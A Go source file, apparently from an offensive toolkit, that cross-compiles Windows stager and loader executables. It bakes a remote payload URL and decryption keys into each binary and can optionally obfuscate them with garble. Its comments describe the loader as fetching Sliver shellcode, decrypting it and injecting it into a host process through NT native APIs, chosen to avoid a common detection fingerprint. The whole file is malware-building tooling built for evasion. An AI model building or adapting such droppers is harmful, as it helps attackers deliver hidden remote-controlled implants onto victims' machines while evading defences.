package stage

import (
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// BuildStager cross-compiles cmd/stager for Windows amd64, embedding the
// payload URL and ChaCha20-Poly1305 key material via -ldflags.
//
// If useGarble is true and garble is in PATH, it uses garble instead of go
// to obfuscate all symbols, string literals, and import paths in the stager.
func BuildStager(bundle *EncBundle, payloadURL, outDir string, useGarble bool) (string, error) {
	return buildWindowsBinary("stager", "stager.exe", bundle, payloadURL, outDir, useGarble)
}

// BuildLoader cross-compiles cmd/loader for Windows amd64 — a process injector
// that fetches Sliver shellcode, decrypts it, and injects into a host process
// via NT native APIs (no Win32 VirtualAlloc/CreateThread fingerprint).
//
// Use with: sliver> generate --format shellcode --os windows --arch amd64 ...
func BuildLoader(bundle *EncBundle, payloadURL, outDir string, useGarble bool) (string, error) {
	return buildWindowsBinary("loader", "loader.exe", bundle, payloadURL, outDir, useGarble)
}

// buildWindowsBinary cross-compiles a cmd/<pkg> package for Windows amd64 with
// ChaCha20-Poly1305 key material and the payload URL baked in via -ldflags.
func buildWindowsBinary(pkg, outName string, bundle *EncBundle, payloadURL, outDir string, useGarble bool) (string, error) {
	modRoot, err := findModRoot()
	if err != nil {
		return "", fmt.Errorf("locating module root: %w", err)
	}

	srcDir := filepath.Join(modRoot, "cmd", pkg)
	if _, err := os.Stat(srcDir); err != nil {
		return "", fmt.Errorf("%s source not found at %s", pkg, srcDir)
	}

	outExe := filepath.Join(outDir, outName)

	ldflags := fmt.Sprintf(
		"-s -w -X main.PayloadURL=%s -X main.KeyHex=%s -X main.NonceHex=%s",
		payloadURL,
		hex.EncodeToString(bundle.Key),
		hex.EncodeToString(bundle.Nonce),
	)

	builder := "go"
	if useGarble {
		if path, err := exec.LookPath("garble"); err == nil {
			builder = path
			fmt.Printf("[*] Using garble for %s obfuscation\n", pkg)
		} else {
			fmt.Printf("[!] garble not found in PATH — falling back to go build\n")
		}
	}

	var cmd *exec.Cmd
	if builder == "go" {
		cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outExe, ".")
	} else {
		cmd = exec.Command(builder, "-literals", "build", "-ldflags", ldflags, "-o", outExe, ".")
	}

	cmd.Dir = srcDir
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("building %s: %w", pkg, err)
	}

	if info, err := os.Stat(outExe); err == nil {
		fmt.Printf("[i] %s size: %.1f KB\n", outName, float64(info.Size())/1024)
	}

	return outExe, nil
}

// findModRoot walks upward from the current working directory looking for go.mod.
func findModRoot() (string, error) {
	if root := os.Getenv("CRYSTALKIT_ROOT"); root != "" {
		return root, nil
	}
	dir, err := os.Getwd()
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return "", fmt.Errorf("go.mod not found; set CRYSTALKIT_ROOT to the repo root")
}
